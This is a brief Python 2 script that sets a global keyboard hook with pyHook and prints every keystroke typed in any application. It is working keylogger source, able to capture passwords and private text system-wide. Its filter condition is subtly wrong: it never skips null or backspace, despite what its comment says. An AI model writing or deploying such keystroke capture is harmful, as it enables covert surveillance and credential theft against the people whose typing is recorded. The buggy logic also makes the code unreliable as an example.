import pythoncom,pyHook

def OnKeyboardEvent(event):
    """
    Process keyboard event
    """
    if event.Ascii != 0 or event.Ascii != 8:  # Skip Null & Backspace
        if event.Ascii == 13:  # Handles a 'Enter' key press
            keylogs = '<return>'
        else:
            keylogs = chr(event.Ascii)

        print keylogs,

# Create a hook manager object
hm=pyHook.HookManager()
try:
    # Set funciton for keystroke processing
    hm.KeyDown = OnKeyboardEvent
except (TypeError, KeyboardInterrupt):
    pass  # Allow us to ignore errors that may cause the code exit
# Set the hook
hm.HookKeyboard()
# Wait forever
pythoncom.PumpMessages()
